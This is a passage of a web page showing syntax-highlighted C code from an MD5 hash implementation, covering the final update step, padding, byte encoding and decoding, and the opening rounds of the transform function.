class=\"token punctuation\">;</span>        </pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>context<span class=\"token operator\">-></span>buffer<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>input<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>inputlen<span class=\"token operator\">-</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">MD5Final</span><span class=\"token punctuation\">(</span>MD5_CTX <span class=\"token operator\">*</span>context<span class=\"token punctuation\">,</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> digest<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> index <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>padlen <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> bits<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    index <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>context<span class=\"token operator\">-></span>count<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">>></span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    padlen <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>index <span class=\"token operator\">&lt;</span> <span class=\"token number\">56</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token punctuation\">(</span><span class=\"token number\">56</span><span class=\"token operator\">-</span>index<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span><span class=\"token punctuation\">(</span><span class=\"token number\">120</span><span class=\"token operator\">-</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token function\">MD5Encode</span><span class=\"token punctuation\">(</span>bits<span class=\"token punctuation\">,</span>context<span class=\"token operator\">-></span>count<span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token function\">MD5Update</span><span class=\"token punctuation\">(</span>context<span class=\"token punctuation\">,</span>PADDING<span class=\"token punctuation\">,</span>padlen<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token function\">MD5Update</span><span class=\"token punctuation\">(</span>context<span class=\"token punctuation\">,</span>bits<span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token function\">MD5Encode</span><span class=\"token punctuation\">(</span>digest<span class=\"token punctuation\">,</span>context<span class=\"token operator\">-></span>state<span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">MD5Encode</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>output<span class=\"token punctuation\">,</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>input<span class=\"token punctuation\">,</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> len<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>j <span class=\"token operator\">&lt;</span> len<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>         output<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> input<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"59\"></td><td><pre>         output<span class=\"token punctuation\">[</span>j<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">>></span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>         output<span class=\"token punctuation\">[</span>j<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>         output<span class=\"token punctuation\">[</span>j<span class=\"token operator\">+</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">>></span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>         i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>         j<span class=\"token operator\">+=</span><span class=\"token number\">4</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">MD5Decode</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>output<span class=\"token punctuation\">,</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>input<span class=\"token punctuation\">,</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> len<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>     <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>     <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>j <span class=\"token operator\">&lt;</span> len<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>     <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>           output<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>                       <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">[</span>j<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>                       <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">[</span>j<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>                       <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">[</span>j<span class=\"token operator\">+</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>           i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>           j<span class=\"token operator\">+=</span><span class=\"token number\">4</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"77\"></td><td><pre>     <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">MD5Transform</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> state<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> block<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>     <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> a <span class=\"token operator\">=</span> state<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>     <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> b <span class=\"token operator\">=</span> state<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>     <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> c <span class=\"token operator\">=</span> state<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>     <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> d <span class=\"token operator\">=</span> state<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>     <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>     <span class=\"token function\">MD5Decode</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span>block<span class=\"token punctuation\">,</span><span class=\"token number\">64</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>     <span class=\"token function\">FF</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xd76aa478</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 1 */</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre> <span class=\"token function\">FF</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xe8c7b756</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 2 */</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre> <span class=\"token function\">FF</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x242070db</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 3 */</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre> <span class=\"token function\">FF</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xc1bdceee</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 4 */</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre> <span class=\"token function\">FF</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf57c0faf</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 5 */</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre> <span class=\"token function\">FF</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4787c62a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 6 */</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre> <span class=\"token function\">FF</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xa8304613</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 7 */</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre> <span class=\"token function\">FF</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">7</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xfd469501</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 8 */</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre> <span class=\"token function\">FF</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x698098d8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 9 */</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre> <span class=\"token function\">FF</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">9</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8b44f7af</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 10 */</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre> <span class=\"token function\">FF</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xffff5bb1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 11 */</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre> <span class=\"token function\">FF</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x895cd7be</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 12 */</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre> <span class=\"token function\">FF</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6b901122</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 13 */</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre> <span class=\"token function\">FF</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xfd987193</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 14 */</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre> <span class=\"token function\">FF</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xa679438e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 15 */</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre> <span class=\"token function\">FF</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x49b40821</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 16 */</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre> </pre></td></tr><tr><td data-num=\"104\"></td><td><pre> <span class=\"token comment\">/* Round 2 */</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre> <span class=\"token function\">GG</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf61e2562</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 17 */</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre> <span class=\"token function\">GG</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xc040b340</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 18 */</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre> <span class=\"token function\">GG</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">14</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x265e5a51</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 19 */</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre> <span class=\"token function\">GG</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xe9b6c7aa</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 20 */</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre> <span class=\"token function\">GG</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xd62f105d</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 21 */</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre> <span class=\"token function\">GG</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">0x2441453</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 22 */</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre> <span class=\"token function\">GG</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">14</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xd8a1e681</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 23 */</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre> <span class=\"token function\">GG</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xe7d3fbc8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 24 */</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre> <span class=\"token function\">GG</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">9</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x21e1cde6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 25 */</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre> <span class=\"token function\">GG</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xc33707d6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 26 */</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre> <span class=\"token function\">GG</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">14</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf4d50d87</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 27 */</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre> <span 